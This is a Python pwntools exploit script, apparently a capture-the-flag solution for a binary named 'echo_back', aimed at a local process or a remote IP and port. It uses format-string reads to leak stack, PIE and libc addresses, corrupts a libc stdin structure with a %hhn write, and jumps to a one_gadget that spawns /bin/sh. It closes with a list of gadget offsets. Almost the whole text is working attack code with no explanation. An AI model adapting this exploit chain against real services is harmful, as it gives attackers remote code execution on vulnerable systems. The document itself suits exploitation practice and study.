#coding:utf-8
from pwn import *
from ctypes import *
debug = 1
elf = ELF('./echo_back')

if debug:
	p = process('./echo_back')
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
	# context.log_level = 'debug'
	#gdb.attach(p)
else:
	p = remote('117.78.43.123', 32619)
	libc = ELF('./libc.so.6')
	#off = 0x001b0000
	context.log_level = 'debug'

def set_name(name):
	p.recvuntil('choice>>')
	p.sendline('1')
	p.recvuntil('name')
	p.send(name)

def echo(content):
	p.recvuntil('choice>>')
	p.sendline('2')	
	p.recvuntil('length:')
	p.sendline('-1')
	p.send(content)

echo('%12$p\n')
p.recvuntil('anonymous say:')
stack_addr = int(p.recvline()[:-1],16)
print '[+] stack :',hex(stack_addr)
echo('%13$p\n')
p.recvuntil('anonymous say:')
pie = int(p.recvline()[:-1],16)-0xd08
print '[+] pie :',hex(pie)
echo('%19$p\n')
p.recvuntil('anonymous say:')
libc.address = int(p.recvline()[:-1],16)-240-libc.symbols['__libc_start_main']
print '[+] system :',hex(libc.symbols['system'])
set_name(p64(libc.address + 0x3c4918)[:-1])
echo('%16$hhn')
p.recvuntil('choice>>')
p.sendline('2')	
p.recvuntil('length:')
padding = p64(libc.address+0x3c4963)*3 + p64(stack_addr-0x28)+p64(stack_addr+0x10)
p.send(padding)
p.sendline("")
for i in range(len(padding)-1):
	p.recvuntil('choice>>')
	p.sendline('2')	
	p.recvuntil('length:')
	p.sendline('')

p.recvuntil('choice>>')
p.sendline('2')	
p.recvuntil('length:')
rop = p64(libc.address + 0x45216)
p.sendline(rop)
p.sendline('')
p.interactive()
"""
0x45216	execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a	execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4	execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147	execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

"""